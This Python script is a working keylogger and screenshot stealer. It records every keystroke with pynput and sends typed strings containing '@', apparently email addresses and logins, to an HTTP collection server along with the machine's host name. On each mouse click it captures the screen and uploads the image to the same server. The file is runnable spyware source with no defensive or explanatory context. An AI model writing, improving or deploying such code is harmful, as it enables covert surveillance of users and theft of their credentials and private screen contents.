from pynput import keyboard
import uuid
import datetime
import platform
from pynput import mouse
import pyautogui
import os
import httpx


array_list = []
user_pass = {}
host_id = platform.node()


def on_press(key):
    try:
        # print(key.char)
        # print('alphanumeric key {0} pressed'.format(key.char))
        array_list.append(key.char)
    except AttributeError:
        string = f'{key}'
        if string == 'Key.space' or string == 'Key.enter':
            if '@' in array_list:
                is_str = ''
                for i in array_list:
                    is_str = is_str + i
                response = httpx.post(f'http://127.0.0.1:9999/keyboard/{is_str}/{host_id}')
                print(response.status_code)
            array_list.clear()
        # print('special key {0} pressed'.format(key))


def on_release(key):
    # print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
'''with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()'''

'''# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
'''
# MOUSE

'''
def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))
'''


def on_click(x, y, button, pressed):
    # print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x, y)))

    if not pressed:
        screenshot = pyautogui.screenshot()
        name = uuid.uuid4()
        if os.name == 'nt':
            file = f'C:\\temp\\shot_{datetime.datetime.now().date()}.jpg'
        else:
            file = f'/tmp/shot_{datetime.datetime.now().date()}.jpg'
        screenshot.save(file)
        file = {'file': open(file, 'rb')}
        response = httpx.post(f'http://127.0.0.1:9999/screen/{name}/{host_id}', files=file)
        print(response.status_code)

        if '@' in array_list:
            is_str = ''
            for i in array_list:
                is_str = is_str+i
            response = httpx.post(f'http://127.0.0.1:9999/keyboard/{is_str}/{host_id}')
            print(response.status_code)


'''
def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))
'''

# Collect events until released
with mouse.Listener(
        on_click=on_click
) as listener_mouse, keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    listener_mouse.join()

# ...or, in a non-blocking fashion:
'''listener_mouse = mouse.Listener(
    on_click=on_click
    )

listener_mouse.start()
'''